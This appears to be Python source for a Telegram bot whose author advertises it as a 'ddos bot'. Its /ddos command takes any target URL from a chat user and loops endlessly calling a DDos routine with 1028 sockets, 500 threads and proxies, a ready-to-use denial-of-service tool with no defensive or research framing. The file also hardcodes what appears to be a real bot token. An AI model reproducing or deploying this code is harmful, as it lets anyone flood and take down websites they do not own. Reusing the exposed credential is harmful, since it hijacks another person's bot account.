import DDos
import telebot
import download



Token = "7123684153:AAEEjAUrTpgb-Vya0ENfiQ4BpflITVuRNXI"
bot = telebot.TeleBot(Token)
@bot.message_handler(['spidi'])
def start (message):
  bot.reply_to (message,"welcome")

@bot.message_handler(['start'])
def start (message):
    bot.reply_to(message, "Hi sir , type /help")

@bot.message_handler(['help'])
def help (message):
    bot.send_message(message.chat.id, "welcome to @SpidiFarish ddos bot:\n /ddos - start a ddos attack \n /help - all command \n /author - author of bot")

@bot.message_handler(['author'])
def author (message):
  bot.send_message(message.chat.id, "Developed By @SpidiFarish")



#---------------



@bot.message_handler(['ddos'])
def ddosa (message):
    msg = bot.send_message(message.chat.id, "target :!")
    bot.register_next_step_handler(msg, ddoss)
def ddoss (message):
  url = message.text
  bot.send_message(message.chat.id, "attack started")
  while True:
    DDos.DDos(url, sockets = 1028, threads = 500, use_proxies = True)

bot.polling(none_stop=True, interval=0)
